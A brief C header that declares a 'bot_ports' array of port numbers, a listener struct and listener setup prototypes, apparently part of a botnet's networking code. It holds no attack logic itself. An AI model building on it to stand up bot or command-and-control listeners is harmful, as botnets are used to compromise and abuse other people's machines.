#pragma once

static uint16_t bot_ports[] = {
	2348, 12381, 8932, 8241, 38441, 23845, 8745, 6463, 7122, 1114, 6969, 1337, 
	4200, 3257, 7214, 2474, 4444, 2222, 3333, 5555, 24811
};

struct listener_t {
	uint16_t port;
	int fd;
} typedef listener_t;

int listener_add_fd(int, uint16_t);

void listener_init(int);
